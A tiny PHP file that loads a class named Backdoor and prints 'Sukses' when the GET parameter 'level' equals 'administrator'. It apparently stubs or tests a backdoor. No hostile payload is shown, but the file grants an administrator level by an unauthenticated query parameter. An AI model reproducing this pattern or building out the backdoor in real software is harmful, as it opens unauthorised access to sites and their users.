<?php
require_once '../../action/function/class.backdoor.php';
$backdoor = new Backdoor();

// $_GET['level'];
if ($_GET['level']=="administrator") {
  echo "Sukses";
}

?>
